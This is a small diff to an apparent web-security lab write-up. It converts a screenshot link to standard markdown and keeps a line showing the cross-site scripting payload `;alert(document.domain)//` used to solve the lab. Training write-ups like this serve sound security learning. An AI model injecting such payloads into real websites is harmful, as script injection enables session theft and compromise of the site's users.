@@ -2,4 +2,4 @@
 
 Injected the following payload to solve the lab:
 `;alert(document.domain)//`
-![[Screenshot 2024-05-16 at 3.12.14 PM.png]]
+![Screenshot 2024-05-16 at 3.12.14 PM](images/Screenshot%202024-05-16%20at%203.12.14%20PM.png)
